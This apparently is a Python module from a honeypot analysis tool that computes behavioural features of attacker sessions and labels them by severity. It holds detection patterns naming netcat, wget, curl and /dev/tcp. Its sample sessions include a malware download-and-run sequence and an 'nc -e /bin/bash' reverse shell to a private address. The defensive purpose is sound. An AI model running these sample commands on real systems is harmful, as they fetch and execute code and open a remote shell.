"""
Feature extraction module for honeypot sessions.
Extracts 15 features to characterize attacker behavior.
"""

import math
import re
import logging
from typing import Dict, Any, List, Optional
import pandas as pd

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

PRIV_PATTERN = r"\b(sudo|su\s|chmod\s+\+s)"
LATERAL_PATTERN = r"\b(ssh|nc|nmap|netcat)\b"
BASE64_PATTERN = r"^[A-Za-z0-9+/]{20,}={0,2}$"
MALICIOUS_SIGS = ["wget", "curl", "nc -e", "bash -i", "/dev/tcp"]

def shannon_entropy(text: str) -> float:
    """
    Calculate the Shannon entropy of a string.

    Args:
        text (str): The input string.

    Returns:
        float: Entropy score (0.0 for empty string).
    """
    if not text:
        return 0.0
    entropy = 0.0
    length = len(text)
    freq = {}
    for char in text:
        freq[char] = freq.get(char, 0) + 1
    for count in freq.values():
        p = count / length
        entropy -= p * math.log2(p)
    return entropy

def extract_features(session: Dict[str, Any]) -> Dict[str, Any]:
    """
    Extract 15 features from a parsed session dictionary.

    Args:
        session (Dict[str, Any]): Parsed session data.

    Returns:
        Dict[str, Any]: Dictionary containing the 15 features.
    """
    features: Dict[str, Any] = {}
    commands: List[str] = session.get("commands", [])
    
    # Session-level features
    features["command_count"] = session.get("command_count", 0)
    features["command_diversity"] = len(set(commands)) / max(len(commands), 1) if commands else 0.0
    features["unique_commands"] = len(set(commands))
    features["session_duration"] = session.get("duration_sec", 0.0)
    features["download_attempts"] = session.get("download_count", 0)
    features["file_upload_count"] = session.get("upload_count", 0)
    features["failed_auth_attempts"] = session.get("login_failed_count", 0)
    
    if features["command_count"] > 1:
        features["inter_command_delay_avg"] = features["session_duration"] / (features["command_count"] - 1)
    else:
        features["inter_command_delay_avg"] = features["session_duration"]
        
    full_cmd_text = " ".join(commands)
    features["privilege_escalation"] = 1 if re.search(PRIV_PATTERN, full_cmd_text) else 0
    features["lateral_movement"] = 1 if re.search(LATERAL_PATTERN, full_cmd_text) else 0
    
    # Payload-level features
    if commands:
        features["command_length_avg"] = sum(len(c) for c in commands) / len(commands)
    else:
        features["command_length_avg"] = 0.0
        
    features["entropy_score"] = shannon_entropy(full_cmd_text)
    
    features["base64_presence"] = 0
    for cmd in commands:
        parts = cmd.split()
        for part in parts:
            if re.match(BASE64_PATTERN, part):
                features["base64_presence"] = 1
                break
        if features["base64_presence"] == 1:
            break
            
    features["known_malicious_signatures"] = sum(1 for sig in MALICIOUS_SIGS if sig in full_cmd_text)
    features["threat_db_matches"] = 0  # [TO BE FILLED] with actual threat intel integration
    
    return features

def derive_label(severity_index: float, config: Optional[Dict[str, Any]] = None) -> str:
    """
    Derive threat label based on severity index (Vi).

    Args:
        severity_index (float): The calculated severity index.
        config (Optional[Dict[str, Any]]): Configuration dictionary.

    Returns:
        str: Threat level label ("Scanner", "Amateur", "Advanced").
    """
    if severity_index < 1.5:
        return "Scanner"
    elif severity_index < 3.0:
        return "Amateur"
    else:
        return "Advanced"

def build_feature_matrix(sessions: List[Dict[str, Any]]) -> pd.DataFrame:
    """
    Build a pandas DataFrame containing feature matrices for given sessions.

    Args:
        sessions (List[Dict[str, Any]]): List of parsed sessions.

    Returns:
        pd.DataFrame: Feature matrix DataFrame.
    """
    rows = []
    for session in sessions:
        feats = extract_features(session)
        feats["session_id"] = session.get("session_id", "[TO BE FILLED]")
        rows.append(feats)
    return pd.DataFrame(rows)

if __name__ == "__main__":
    sample_sessions = [
        {
            "session_id": "scanner_1",
            "commands": ["whoami", "uname -a"],
            "command_count": 2,
            "duration_sec": 2.0,
            "download_count": 0,
            "upload_count": 0,
            "login_failed_count": 5
        },
        {
            "session_id": "amateur_1",
            "commands": ["whoami", "wget http://example.com/malware", "chmod +x malware", "./malware"],
            "command_count": 4,
            "duration_sec": 120.0,
            "download_count": 1,
            "upload_count": 0,
            "login_failed_count": 1
        },
        {
            "session_id": "advanced_1",
            "commands": ["sudo -l", "nc -e /bin/bash 10.0.0.1 4444", "ssh user@10.0.0.2"],
            "command_count": 3,
            "duration_sec": 300.0,
            "download_count": 0,
            "upload_count": 1,
            "login_failed_count": 0
        }
    ]
    
    df = build_feature_matrix(sample_sessions)
    print("Extracted Features Matrix:")
    print(df)
